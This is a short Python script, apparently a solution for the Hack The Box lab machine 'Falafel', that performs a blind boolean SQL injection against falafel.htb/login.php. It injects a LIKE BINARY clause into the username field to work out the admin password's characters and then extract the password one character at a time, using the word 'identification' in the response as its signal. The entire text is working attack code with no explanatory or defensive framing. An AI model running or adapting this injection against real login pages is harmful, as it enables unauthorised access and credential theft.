import requests

user = 'admin'
keyspace = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+'
modified_keyspace = ''
for key in keyspace:
    key=key.replace('%','\\%')
    key=key.replace('_','\\_')
    resp = requests.post(url='http://falafel.htb/login.php',data= {'username': user+'\' AND password LIKE BINARY \'%' + key +'%\'; -- ','password': 'a'})
    if 'identification' in resp.text:
       modified_keyspace += key 

print(modified_keyspace)
password = ''
while True:
    foundOne = False
    for key in modified_keyspace:
        key=key.replace('%','\\%')
        key=key.replace('_','\\_')
        resp = requests.post(url='http://falafel.htb/login.php',data= {'username': user+'\' AND password LIKE BINARY \''+password + key +'%\'; -- ','password': 'a'})
        if 'identification' in resp.text:
           password += key 
           foundOne = True
           print(password)
           break
    if not foundOne:
        break

print(password)
    
